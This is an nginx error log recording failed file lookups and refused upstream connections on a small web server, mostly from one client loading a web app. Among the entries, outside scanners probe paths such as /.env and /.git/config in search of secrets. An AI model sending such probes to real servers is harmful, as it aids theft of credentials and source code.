2024/08/06 08:46:37 [error] 30#30: *2 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /favicon.ico HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api"
2024/08/06 08:46:55 [error] 30#30: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 211.218.17.9, server: _, request: "GET /app HTTP/1.1", upstream: "http://10.10.194.4:8501/app", host: "211.218.17.10"
2024/08/06 08:48:20 [error] 30#30: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 211.218.17.9, server: _, request: "GET /app HTTP/1.1", upstream: "http://10.10.194.4:8501/app", host: "211.218.17.10"
2024/08/06 08:48:22 [error] 30#30: *2 connect() failed (111: Connection refused) while connecting to upstream, client: 211.218.17.9, server: _, request: "GET /app HTTP/1.1", upstream: "http://10.10.194.4:8501/app", host: "211.218.17.10"
2024/08/06 08:50:35 [error] 29#29: *2 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 08:50:40 [error] 29#29: *2 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 08:55:39 [error] 29#29: *1 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 08:55:40 [error] 29#29: *1 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 08:55:40 [error] 29#29: *1 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 08:55:40 [error] 29#29: *1 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 08:55:49 [error] 29#29: *1 open() "/etc/nginx/html/static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:55:49 [error] 30#30: *2 open() "/etc/nginx/html/static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:55:49 [error] 31#31: *6 open() "/etc/nginx/html/static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:55:50 [error] 31#31: *6 open() "/etc/nginx/html/static/css/main.29bca1b5.css" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/css/main.29bca1b5.css HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:55:50 [error] 30#30: *2 open() "/etc/nginx/html/static/js/main.d55f6a3c.js" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/js/main.d55f6a3c.js HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:55:50 [error] 30#30: *2 open() "/etc/nginx/html/favicon.png" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /favicon.png HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:55:50 [error] 30#30: *2 open() "/etc/nginx/html/favicon.png" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /favicon.png HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:03 [error] 30#30: *2 open() "/etc/nginx/html/static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:03 [error] 31#31: *6 open() "/etc/nginx/html/static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:03 [error] 29#29: *1 open() "/etc/nginx/html/static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:03 [error] 30#30: *2 open() "/etc/nginx/html/static/css/main.29bca1b5.css" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/css/main.29bca1b5.css HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:03 [error] 30#30: *2 open() "/etc/nginx/html/static/js/main.d55f6a3c.js" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/js/main.d55f6a3c.js HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:03 [error] 30#30: *2 open() "/etc/nginx/html/favicon.png" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /favicon.png HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:43 [error] 30#30: *2 open() "/etc/nginx/html/static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:43 [error] 29#29: *1 open() "/etc/nginx/html/static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:43 [error] 31#31: *6 open() "/etc/nginx/html/static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:43 [error] 32#32: *8 open() "/etc/nginx/html/static/css/main.29bca1b5.css" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/css/main.29bca1b5.css HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:43 [error] 32#32: *8 open() "/etc/nginx/html/static/js/main.d55f6a3c.js" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/js/main.d55f6a3c.js HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:43 [error] 32#32: *8 open() "/etc/nginx/html/favicon.png" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /favicon.png HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:49 [error] 32#32: *8 open() "/etc/nginx/html/static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Regular.0d69e5ff5e92ac64a0c9.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:49 [error] 31#31: *6 open() "/etc/nginx/html/static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-SemiBold.abed79cd0df1827e18cf.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:49 [error] 29#29: *1 open() "/etc/nginx/html/static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/media/SourceSansPro-Bold.118dea98980e20a81ced.woff2 HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:49 [error] 30#30: *2 open() "/etc/nginx/html/static/css/main.29bca1b5.css" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/css/main.29bca1b5.css HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:49 [error] 30#30: *2 open() "/etc/nginx/html/static/js/main.d55f6a3c.js" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /static/js/main.d55f6a3c.js HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 08:56:49 [error] 30#30: *2 open() "/etc/nginx/html/favicon.png" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /favicon.png HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app"
2024/08/06 09:01:21 [error] 34#34: *22 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/06 09:01:37 [error] 34#34: *22 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10"
2024/08/06 09:01:56 [error] 34#34: *22 open() "/etc/nginx/html/openapi.json" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /openapi.json HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/api/docs"
2024/08/06 10:05:21 [error] 30#30: *2 open() "/etc/nginx/html/_stcore/host-config" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /_stcore/host-config HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/06 10:05:21 [error] 29#29: *1 open() "/etc/nginx/html/_stcore/health" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /_stcore/health HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/app/"
2024/08/06 10:12:26 [error] 34#34: *20 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 181.143.20.60, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/06 13:11:22 [error] 40#40: *23 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 172.206.142.216, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 13:15:00 [error] 38#38: *24 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 116.255.117.86, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/06 13:47:24 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 116.255.117.86, server: _, request: "GET /app/ HTTP/1.1", upstream: "http://10.10.203.4:8001/", host: "211.218.17.10"
2024/08/06 14:15:43 [error] 35#35: *21 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 41.111.213.190, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/06 14:31:41 [error] 42#42: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 149.50.103.48, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/07 01:38:31 [error] 37#37: *19 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.216.149.183, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/07 01:44:18 [error] 39#39: *20 open() "/etc/nginx/html/.git/config" failed (2: No such file or directory), client: 83.147.52.49, server: _, request: "GET /.git/config HTTP/1.1", host: "211.218.17.10"
2024/08/07 01:56:43 [error] 40#40: *21 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 51.158.205.47, server: _, request: "GET / HTTP/1.0"
2024/08/07 01:59:14 [error] 41#41: *22 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 149.50.103.48, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/07 02:18:14 [error] 42#42: *23 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 184.105.247.194, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/07 02:20:28 [error] 43#43: *24 "/etc/nginx/html/webui/index.html" is not found (2: No such file or directory), client: 184.105.247.194, server: _, request: "GET /webui/ HTTP/1.1", host: "211.218.17.10"
2024/08/07 02:21:27 [error] 49#49: *44 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 184.105.247.194, server: _, request: "GET /favicon.ico HTTP/1.1", host: "211.218.17.10"
2024/08/07 02:22:13 [error] 51#51: *49 "/etc/nginx/html/geoserver/web/index.html" is not found (2: No such file or directory), client: 184.105.247.194, server: _, request: "GET /geoserver/web/ HTTP/1.1", host: "211.218.17.10"
2024/08/07 05:17:47 [error] 42#42: *43 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 37.230.62.233, server: _, request: "GET /.env HTTP/1.1", host: "211.218.17.10"
2024/08/07 07:13:43 [error] 35#35: *30 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 5.8.11.202, server: _, request: "GET / HTTP/1.0"
2024/08/07 07:19:21 [error] 37#37: *32 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 149.50.103.48, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/07 07:36:26 [error] 42#42: *44 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.121, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/07 07:36:35 [error] 43#43: *45 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 167.94.138.121, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/08 00:59:21 [error] 37#37: *34 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 149.50.103.48, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/08 01:55:13 [error] 45#45: *58 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 106.75.20.12, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10:80"
2024/08/08 01:58:35 [error] 46#46: *59 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 106.75.168.236, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/08 01:58:35 [error] 47#47: *60 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 106.75.168.236, server: _, request: "GET /favicon.ico HTTP/1.1", host: "211.218.17.10"
2024/08/08 04:38:58 [error] 40#40: *32 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 198.235.24.206, server: _, request: "GET / HTTP/1.0"
2024/08/08 05:06:50 [error] 29#29: *1 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET / HTTP/1.1", host: "211.218.17.10"
2024/08/08 05:06:50 [error] 29#29: *1 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /favicon.ico HTTP/1.1", host: "211.218.17.10", referrer: "http://211.218.17.10/"
2024/08/08 05:06:53 [error] 29#29: *1 open() "/etc/nginx/html/메ㅔ" failed (2: No such file or directory), client: 211.218.17.9, server: _, request: "GET /%EB%A9%94%E3%85%94 HTTP/1.1", host: "211.218.17.10"
2024/08/08 05:12:03 [error] 58#58: *107 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 5.8.11.202, server: _, request: "GET / HTTP/1.0"
2024/08/20 00:23:18 [error] 29#29: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 211.218.17.9, server: _, request: "POST /api/v1/auth/login/access-token HTTP/1.1", upstream: "http://172.18.0.3:8000/v1/auth/login/access-token", host: "34.47.65.139"
